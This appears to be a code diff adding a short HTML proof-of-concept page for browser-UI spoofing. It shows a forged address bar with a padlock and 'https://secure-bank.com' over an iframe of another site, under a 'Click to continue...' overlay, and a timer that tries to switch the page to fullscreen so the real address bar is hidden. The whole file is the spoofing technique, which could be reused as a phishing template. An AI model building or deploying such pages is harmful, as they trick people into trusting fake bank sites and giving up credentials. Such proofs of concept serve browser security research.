@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Browser UI PoC</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: white;
+            text-align: center;
+        }
+        #fake-ui {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: #f1f1f1;
+            padding: 10px;
+            font-size: 18px;
+            font-family: sans-serif;
+        }
+        #fake-ui span {
+            color: green;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+    <script>
+        function enterFullscreen() {
+            let elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            }
+            document.getElementById('overlay').style.display = 'none';
+        }
+    </script>
+</head>
+<body onload="setTimeout(enterFullscreen, 2000)">
+
+    <div id="fake-ui">🔒 <span>https://secure-bank.com</span></div>
+    <iframe src="https://example.com"></iframe>
+
+    <div id="overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:white;text-align:center;padding-top:50%;">
+        Click to continue...
+    </div>
+
+</body>
+</html>
